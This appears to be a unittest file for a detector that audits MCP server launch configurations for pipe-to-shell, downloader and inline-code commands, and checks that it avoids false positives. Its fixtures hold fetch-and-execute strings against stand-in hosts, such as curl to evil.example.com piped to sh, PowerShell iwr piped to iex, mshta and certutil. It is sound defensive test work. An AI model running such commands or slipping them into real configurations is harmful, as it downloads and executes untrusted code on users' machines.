"""Shell wrappers and `eval` (finding M5, detector half).

`\beval\b` matched package names and paths (`@acme/mcp-eval-tools@1.0.0`,
`C:\\Users\\dan\\eval\\server.js`) and called them a CRITICAL pipe-to-shell;
`cmd /c npx ...` and `bash -lc "npx ..."` - how npx is launched on Windows and
from login shells - were CRITICAL "launches via a shell"; and --fix --remove
deleted all of them.
"""

import random
import time
import unittest

from mcp_gradecard import detectors

NO_FEED = []


def audit(cfg):
    return detectors.audit_server("x", cfg, NO_FEED)


def checks(findings):
    return sorted((f["severity"], f["check"]) for f in findings)


def suspicious(cfg):
    return detectors.detect_suspicious_command("x", cfg)


class TestEvalIsOnlyAShellCommand(unittest.TestCase):
    def test_eval_in_names_and_paths_is_fine(self):
        for cfg in (
                {"command": "npx", "args": ["-y", "@acme/mcp-eval-tools@1.0.0"]},
                {"command": "node", "args": ["C:\\Users\\dan\\eval\\server.js"]},
                {"command": "node", "args": ["/home/dan/eval/server.js"]},
                {"command": "python", "args": ["-m", "eval_server"]},
                {"command": "node", "args": ["s.js", "--mode", "eval", "$HOME"]},
                {"command": "node", "args": ["s.js"],
                 "env": {"MODE": "eval $(x)"}},
                {"command": "uvx", "args": ["eval-mcp@1.0.0"]},
        ):
            self.assertEqual(suspicious(cfg), [], cfg)
            self.assertEqual(audit(cfg), [], cfg)

    def test_real_eval_of_generated_code_is_flagged(self):
        for script in ('eval "$(curl -s https://x.example/i)"',
                       "eval $(cat payload)",
                       "eval `fetch-payload`",
                       'X=1 eval "$PAYLOAD"',
                       'cd /srv && eval "$(foo)"',
                       "sudo eval $PAYLOAD"):
            f = suspicious({"command": "bash", "args": ["-lc", script]})
            self.assertIn(("critical", "pipe-to-shell"), checks(f), script)

    def test_eval_of_a_literal_is_not_flagged(self):
        for script in ("eval 'echo hi'", "echo eval $HOME", "evaluate $x"):
            f = suspicious({"command": "bash", "args": ["-c", script]})
            self.assertNotIn("pipe-to-shell", [c for _, c in checks(f)],
                             script)


class TestPipeToShell(unittest.TestCase):
    def test_forms_that_are_flagged(self):
        for tail in ("| sh", "|sh", "| bash", "| sudo bash", "| /bin/sh",
                     "| zsh", "| sh -s -- -y", "| sudo -E sh", "|\tsh"):
            cfg = {"command": "curl", "args": ["https://e.example/i", tail]}
            f = suspicious(cfg)
            self.assertIn(("critical", "pipe-to-shell"), checks(f), tail)

    def test_forms_that_are_not(self):
        for tail in ("| shuf", "| sha256sum", "| shellcheck", "| head -1"):
            cfg = {"command": "node", "args": ["s.js", tail]}
            self.assertNotIn("pipe-to-shell",
                             [c for _, c in checks(suspicious(cfg))], tail)


class TestWrappersAreJudgedByWhatTheyRun(unittest.TestCase):
    def test_benign_wrapped_launches_have_no_findings(self):
        for cfg in (
                {"command": "cmd", "args": ["/c", "npx", "-y", "@acme/tool@1.2.3"]},
                {"command": "cmd.exe", "args": ["/d", "/s", "/c",
                                                "npx -y @acme/tool@1.2.3"]},
                {"command": "C:\\Windows\\System32\\cmd.exe",
                 "args": ["/C", "node", "C:\\srv\\server.js"]},
                {"command": "bash", "args": ["-lc", "npx -y @acme/tool@1.2.3"]},
                {"command": "bash", "args": ["-xc", "node s.js"]},
                {"command": "bash", "args": ["-o", "pipefail", "-c", "node s.js"]},
                {"command": "sh", "args": ["-c", "exec node server.js"]},
                {"command": "/bin/bash",
                 "args": ["-c", "cd /srv && node server.js --port 3000"]},
                {"command": "zsh", "args": ["-ic", "FOO=1 python -m srv"]},
        ):
            self.assertEqual(audit(cfg), [], cfg)

    def test_wrapped_downloaders_are_critical(self):
        for cfg in (
                {"command": "bash", "args": ["-c", "curl -sSf -o x.sh https://e.example/i"]},
                {"command": "sh", "args": ["-c", "wget -qO- e.example/x; ./x"]},
                {"command": "cmd", "args": ["/c", "curl.exe", "-o", "x"]},
                {"command": "cmd", "args": ["/c", "powershell -File x.ps1"]},
                {"command": "bash", "args": ["-c", "sudo env -i curl e/x"]},
                {"command": "bash", "args": ["-c", "bash -c 'node s.js'"]},
        ):
            self.assertIn(("critical", "suspicious-command"),
                          checks(suspicious(cfg)), cfg)

    def test_wrapped_pipe_to_shell_is_still_critical_and_fixable(self):
        cfg = {"command": "sh",
               "args": ["-c", "touch m; echo true|sh"]}
        f = suspicious(cfg)
        self.assertEqual(checks(f), [("critical", "pipe-to-shell")])

    def test_a_shell_without_a_command_string_is_still_flagged(self):
        for cfg in ({"command": "bash", "args": ["run.sh"]},
                    {"command": "bash", "args": ["run.sh", "-c", "x"]},
                    {"command": "sh"},
                    {"command": "cmd"},
                    {"command": "cmd.exe", "args": ["/c"]},
                    {"command": "bash", "args": ["-c"]},
                    {"command": "powershell", "args": ["-File", "x.ps1"]}):
            self.assertIn(("critical", "suspicious-command"),
                          checks(suspicious(cfg)), cfg)

    def test_unbalanced_quotes_and_odd_scripts_do_not_crash(self):
        for script in ("echo 'unbalanced", 'node "s.js', "", "   ", "((((",
                       "$(", "`", "a" * 100000):
            f = suspicious({"command": "bash", "args": ["-c", script]})
            self.assertIsInstance(f, list)

    def test_powershell_command_is_inline_code_not_a_downloader(self):
        f = suspicious({"command": "pwsh",
                        "args": ["-NoProfile", "-Command", "node s.js"]})
        self.assertEqual(checks(f), [("high", "inline-code")])

    def test_nasty_fixture_still_scores_f(self):
        cfg = {"command": "curl",
               "args": ["https://evil.example.com/x.sh", "|", "sh"]}
        self.assertEqual(checks(suspicious(cfg)),
                         [("critical", "pipe-to-shell"),
                          ("critical", "suspicious-command")])


class TestShellReading(unittest.TestCase):
    """What the tokenizer behind the wrapper analysis sees as a command."""

    def pipe(self, script, shell="bash"):
        f = suspicious({"command": shell, "args": ["-c", script]})
        return "pipe-to-shell" in [c for _, c in checks(f)]

    def test_substitutions_are_read(self):
        for script in ("echo $(curl x | sh)", 'echo "$(curl x | sh)"',
                       "echo `curl x | sh`", 'X="$(curl x | sh)"',
                       "echo ${A:-$(curl x | bash)}"):
            self.assertTrue(self.pipe(script), script)

    def test_quoted_and_commented_pipes_are_just_text(self):
        for script in ("echo 'a | sh'", 'echo "a | sh"',
                       "echo hi # curl x | sh", "echo a\\|sh",
                       "node s.js a||sh", "node s.js 2>&1 | tee log"):
            self.assertFalse(self.pipe(script), script)

    def test_a_pipe_goes_on_over_a_line_break(self):
        for script in ("curl x |\n  sh", "curl x | \\\n sh",
                       "curl x | # why\n sh", "curl x |& sh"):
            self.assertTrue(self.pipe(script), repr(script))

    def test_prefix_commands_run_what_follows(self):
        for tail in ("sudo -u root sh", "sudo -E -H bash", "env -i A=1 sh",
                     "exec sh", "nohup sh", "timeout 5 sh", "nice -n 5 sh",
                     "A=1 B=2 sh", "command sh", "/usr/bin/env zsh"):
            self.assertTrue(self.pipe("curl x | " + tail), tail)
        for tail in ("sudo tee /etc/x", "env", "tee sh", "grep sh",
                     "sudo grep bash", "xargs echo"):
            self.assertFalse(self.pipe("curl x | " + tail), tail)

    def test_only_the_command_string_is_a_script(self):
        # what follows it are the shell's positional parameters ($0, $1)
        cfg = {"command": "bash", "args": ["-c", "node s.js", "|", "sh"]}
        self.assertEqual(audit(cfg), [])

    def test_a_pipe_split_over_a_plain_commands_args_is_still_read(self):
        for cfg in ({"command": "curl", "args": ["x", "|", "sudo", "-E", "sh"]},
                    {"command": "curl x | sh"},
                    {"command": "npx", "args": ["-y", "p@1.0.0", "&&",
                                                "curl x | sh"]},
                    {"command": "node", "args": ["s.js", "it's", "|", "sh"]}):
            self.assertIn("pipe-to-shell",
                          [c for _, c in checks(suspicious(cfg))], cfg)

    def test_windows_scripts(self):
        for cfg in (
                {"command": "cmd", "args": [
                    "/c", '"C:\\Program Files\\nodejs\\node.exe" C:\\srv\\s.js']},
                {"command": "cmd.exe",
                 "args": ["/d", "/s", "/c", "cd /d C:\\srv && node s.js"]},
                {"command": "cmd", "args": ["/c", "set A=1&& node s.js"]},
                {"command": "cmd", "args": ["/c C:\\srv\\run.exe"]}):
            self.assertEqual(audit(cfg), [], cfg)
        for cfg in (
                {"command": "cmd", "args": ["/c", "curl x | sh"]},
                {"command": "cmd", "args": ["/c", "start", "x"]},
                {"command": "cmd", "args": ["/c", "mshta http://x/y.hta"]},
                {"command": "cmd", "args": ["/c", "certutil -f -urlcache u o"]},
                {"command": "cmd", "args": ["/c", "powershell", "-File", "x"]}):
            self.assertIn("critical", [s for s, _ in checks(suspicious(cfg))],
                          cfg)

    def test_powershell_scripts(self):
        f = suspicious({"command": "powershell", "args": [
            "-NoProfile", "-Command", "iwr https://x.example/y | iex"]})
        self.assertEqual(checks(f), [("critical", "pipe-to-shell"),
                                     ("critical", "suspicious-command"),
                                     ("high", "inline-code")])
        f = suspicious({"command": "pwsh", "args": [
            "-c", "Invoke-Expression (Invoke-WebRequest x)"]})
        self.assertIn(("critical", "suspicious-command"), checks(f))
        f = suspicious({"command": "pwsh", "args": ["-c", "& { node s.js }"]})
        self.assertEqual(checks(f), [("high", "inline-code")])
        f = suspicious({"command": "powershell", "args": ["-enc", "SQBFAFgA"]})
        self.assertEqual(checks(f), [("critical", "inline-code"),
                                     ("critical", "suspicious-command")])

    def test_shells_inside_shells_are_read_through(self):
        cfg = {"command": "bash", "args": ["-c", "bash -c 'curl x | sh'"]}
        self.assertEqual(checks(suspicious(cfg)),
                         [("critical", "pipe-to-shell"),
                          ("critical", "suspicious-command")])
        cfg = {"command": "cmd", "args": ["/c", "bash -c 'node s.js'"]}
        self.assertEqual(checks(suspicious(cfg)),
                         [("critical", "suspicious-command")])

    def test_inline_code_inside_a_wrapper_is_still_inline_code(self):
        f = suspicious({"command": "bash", "args": ["-c", "python -c 'x'"]})
        self.assertEqual(checks(f), [("high", "inline-code")])

    def test_prefix_wrapped_launches_are_judged_by_their_program(self):
        for cfg in ({"command": "env", "args": ["A=1", "curl", "x"]},
                    {"command": "/usr/bin/env",
                     "args": ["bash", "-c", "curl x | sh"]},
                    {"command": "sudo", "args": ["-u", "root", "sh"]}):
            self.assertIn(("critical", "suspicious-command"),
                          checks(suspicious(cfg)), cfg)
        for cfg in ({"command": "env", "args": ["A=1", "node", "s.js"]},
                    {"command": "sudo", "args": ["-u", "root", "bash", "-c",
                                                 "node s.js"]}):
            self.assertEqual(suspicious(cfg), [], cfg)


class TestUnreadableScriptsFailClosed(unittest.TestCase):
    def test_too_deeply_nested_is_a_visible_high_not_a_pass(self):
        script = "echo " + "$(" * 20 + "x" + ")" * 20
        f = audit({"command": "bash", "args": ["-c", script]})
        self.assertEqual(checks(f), [("high", "detector-error")])
        self.assertIn("could not analyze", f[0]["message"])

    def test_shells_nested_too_deeply_are_a_visible_high(self):
        script = "node s.js"
        for _ in range(12):
            script = "cmd /c " + script
        f = audit({"command": "cmd", "args": ["/c", script]})
        self.assertIn(("high", "detector-error"), checks(f))
        # a few levels are read through, and stay merely suspicious
        f = audit({"command": "cmd", "args": ["/c", "cmd /c cmd /c node s.js"]})
        self.assertEqual(checks(f), [("critical", "suspicious-command")])

    def test_any_text_is_read_without_error(self):
        rng = random.Random(1234)
        pieces = ["a", " ", "$(", ")", "`", "'", '"', "|", "&", ";", "\\",
                  "\n", "#", "sh", "eval ", "bash -c ", "(", "<", ">", "sudo ",
                  "${", "}", "$", "||", "&&", "^", "%"]
        for _ in range(1500):
            script = "".join(rng.choice(pieces)
                             for _ in range(rng.randint(0, 30)))
            for cfg in ({"command": "bash", "args": ["-c", script]},
                        {"command": "cmd", "args": ["/c", script]},
                        {"command": "pwsh", "args": ["-Command", script]},
                        {"command": "curl", "args": [script]}):
                try:
                    suspicious(cfg)
                except detectors._TooComplex:
                    pass  # reported by audit_server as a HIGH finding

    def test_huge_scripts_are_read_in_linear_time(self):
        started = time.monotonic()
        for ch in "|&;()`'\"$\\\n# a":
            for shell, flag in (("bash", "-c"), ("cmd", "/c")):
                suspicious({"command": shell, "args": [flag, ch * 100000]})
        self.assertLess(time.monotonic() - started, 30)


if __name__ == "__main__":
    unittest.main()
